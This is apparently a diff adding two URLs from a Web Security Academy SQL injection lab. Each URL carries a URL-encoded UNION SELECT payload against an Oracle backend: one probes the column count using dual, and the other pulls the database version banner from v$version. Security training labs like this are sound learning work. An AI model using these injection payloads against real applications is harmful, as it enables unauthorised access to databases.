@@ -1,0 +1,2 @@
+https://0a42000a03b6a843808d9988008700b3.web-security-academy.net/filter?category=%27+UNION+SELECT+%27a%27,%27b%27+FROM+dual--
+https://0a42000a03b6a843808d9988008700b3.web-security-academy.net/filter?category=%27+UNION+SELECT+banner,%27b%27+FROM+v$version--
